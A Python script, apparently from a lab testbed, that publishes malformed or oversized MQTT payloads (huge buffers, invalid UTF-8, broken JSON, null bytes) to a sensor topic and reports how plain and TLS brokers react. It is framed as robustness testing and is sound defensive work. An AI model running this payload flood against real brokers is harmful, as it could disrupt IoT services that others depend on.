#!/usr/bin/env python3
"""Envia payloads malformados ou anormalmente grandes ao tópico do sensor e
reporta a resposta do broker (aceite, erro, desconexão).

O objetivo (docs/specs/track-b-availability-dos.md) é verificar a robustez do
parsing/buffer do broker sob entrada adversarial — não forjar leituras nem
esgotar conexões, os outros dois ataques da Fase 4. Assim como o injector, este
script NUNCA apresenta certificado de cliente no broker secure e NUNCA herda
credenciais do ambiente.
"""

import dataclasses
import json
import os
import ssl
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import paho.mqtt.client as mqtt

from args_malformed_payload import MalformedPayloadArgs, parse_args

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
# Mesmo raciocínio de injector.py: o script roda tanto direto do host (onde
# REPO_ROOT resolve os certs em infra/...) quanto dentro do container attacker
# (onde ATTACKER_CA_PATH, setado no docker-compose.yml, é quem manda).
CA_PATH = Path(
    os.environ.get(
        "ATTACKER_CA_PATH",
        str(REPO_ROOT / "infra" / "mosquitto" / "secure" / "certs" / "ca.crt"),
    )
)

# Janela de observação após cada publish para detectar se o broker derrubou a
# conexão em reação ao payload malformado. O drop não é síncrono com o publish
# (chega pelo loop via on_disconnect), então precisamos esperar um pouco em vez
# de checar o estado logo após client.publish() retornar.
DISCONNECT_OBSERVATION_SECONDS = 2.0


@dataclass
class MalformedPayloadResult:
    target: str
    topic: str
    host: str
    port: int
    mode: str
    connect_status: str
    connect_error: Optional[str]
    attempted: int
    publish_accepted: int
    disconnected_after_publish: bool
    broker_response_summary: str
    started_at: str
    finished_at: str


def build_payload(args: MalformedPayloadArgs) -> bytes:
    if args.mode == "giant":
        return b"x" * args.size_bytes
    if args.mode == "invalid-utf8":
        return b"\xff\xfe\x00\x01invalid"
    if args.mode == "invalid-json":
        return b'{"temperature": 22.5, "humidity":'
    if args.mode == "null-bytes":
        return b"temp=22.5\x00\x00\x00malicious"
    raise ValueError(f"modo desconhecido: {args.mode}")


def connect(args: MalformedPayloadArgs) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=args.client_id,
    )
    if args.username is not None or args.password is not None:
        client.username_pw_set(args.username, args.password)

    # Mesma espera síncrona por CONNACK que injector.py usa: client.connect()
    # não confirma a conexão, e no broker secure o handshake TLS pode ser
    # abortado sem exceção imediata.
    established = threading.Event()
    outcome: dict = {"reason": None, "connected": False}

    def on_connect(client, userdata, flags, reason_code, properties=None):
        outcome["reason"] = reason_code
        outcome["connected"] = not reason_code.is_failure
        established.set()

    def on_disconnect(client, userdata, *rest):
        established.set()

    client.on_connect = on_connect
    client.on_disconnect = on_disconnect

    if args.target == "secure":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.load_verify_locations(cafile=str(CA_PATH))
        # Sem load_cert_chain de propósito, como em injector.py: este script
        # também não possui certificado de cliente.
        context.check_hostname = False
        client.tls_set_context(context)

    client.connect(args.host, args.port, keepalive=30)
    client.loop_start()

    if not established.wait(timeout=10) or not outcome["connected"]:
        client.loop_stop()
        try:
            client.disconnect()
        except Exception:
            pass
        reason = outcome["reason"]
        detail = str(reason) if reason is not None else "handshake abortado (sem CONNACK)"
        raise ConnectionError(f"conexão não estabelecida: {detail}")

    return client


def run(args: MalformedPayloadArgs) -> MalformedPayloadResult:
    topic = f"sensors/{args.sensor_id}/telemetry"
    started_at = datetime.now(timezone.utc).isoformat()

    try:
        client = connect(args)
    except Exception as exc:
        return MalformedPayloadResult(
            target=args.target,
            topic=topic,
            host=args.host,
            port=args.port,
            mode=args.mode,
            connect_status="rejected",
            connect_error=str(exc),
            attempted=0,
            publish_accepted=0,
            disconnected_after_publish=False,
            broker_response_summary="erro no cliente ao publicar",
            started_at=started_at,
            finished_at=datetime.now(timezone.utc).isoformat(),
        )

    payload = build_payload(args)

    # A partir daqui a conexão já foi confirmada; qualquer disparo de
    # on_disconnect passa a significar que o broker derrubou a conexão em
    # reação a um publish, não mais parte do handshake inicial.
    disconnect_event = threading.Event()

    def on_disconnect(client, userdata, *rest):
        disconnect_event.set()

    client.on_disconnect = on_disconnect

    attempted = 0
    publish_accepted = 0
    disconnected_after_publish = False
    try:
        for _ in range(args.count):
            if disconnect_event.is_set():
                # Já caiu numa iteração anterior: publicar de novo não tem
                # sentido, o socket não existe mais.
                break
            disconnect_event.clear()
            info = client.publish(topic, payload, qos=args.qos)
            if args.qos > 0:
                try:
                    info.wait_for_publish(timeout=5)
                except Exception:
                    pass
            attempted += 1
            if info.rc == mqtt.MQTT_ERR_SUCCESS:
                publish_accepted += 1
            if disconnect_event.wait(timeout=DISCONNECT_OBSERVATION_SECONDS):
                disconnected_after_publish = True
    finally:
        client.loop_stop()
        try:
            client.disconnect()
        except Exception:
            pass

    if disconnected_after_publish:
        broker_response_summary = "broker desconectou apos publish"
    elif publish_accepted < attempted:
        broker_response_summary = "erro no cliente ao publicar"
    else:
        broker_response_summary = "aceito sem erro aparente"

    return MalformedPayloadResult(
        target=args.target,
        topic=topic,
        host=args.host,
        port=args.port,
        mode=args.mode,
        connect_status="connected",
        connect_error=None,
        attempted=attempted,
        publish_accepted=publish_accepted,
        disconnected_after_publish=disconnected_after_publish,
        broker_response_summary=broker_response_summary,
        started_at=started_at,
        finished_at=datetime.now(timezone.utc).isoformat(),
    )


def main(argv=None) -> int:
    args = parse_args(argv)
    print(
        f"[{args.target}] enviando {args.count}x payload modo={args.mode} em "
        f"sensors/{args.sensor_id}/telemetry ({args.host}:{args.port})",
        file=sys.stderr,
    )
    result = run(args)

    if result.connect_status == "rejected":
        print(f"[{args.target}] conexão recusada: {result.connect_error}", file=sys.stderr)
    else:
        print(
            f"[{args.target}] {result.broker_response_summary} "
            f"({result.publish_accepted}/{result.attempted} aceitos no cliente, "
            f"desconectou={result.disconnected_after_publish})",
            file=sys.stderr,
        )

    print(json.dumps(dataclasses.asdict(result)))

    # Diferente de injector.py, não há um "resultado esperado" único (plain
    # aceita, secure rejeita) para comparar: o propósito aqui é só observar e
    # reportar a reação do broker, então mantemos o exit code em 0 sempre que
    # o script rodou sem exceção — a classificação vive no JSON/stderr.
    return 0


if __name__ == "__main__":
    sys.exit(main())
